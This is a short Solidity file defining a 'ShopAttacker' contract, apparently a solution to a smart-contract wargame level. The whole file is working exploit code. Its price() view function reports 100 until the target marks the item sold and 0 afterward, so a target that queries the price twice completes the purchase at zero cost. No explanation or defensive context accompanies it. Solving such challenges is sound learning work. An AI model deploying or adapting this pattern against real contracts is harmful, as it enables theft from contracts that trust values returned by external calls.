// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract ShopAttacker {
    address private target;

    constructor(address _target) {
        target = _target;
    }

    function price() external view returns (uint256) {
        bool isSold = IShop(target).isSold();
        if (isSold) {
            return 0;
        }
        return 100;
    }

    function attack() external {
        IShop(target).buy();
    }
}
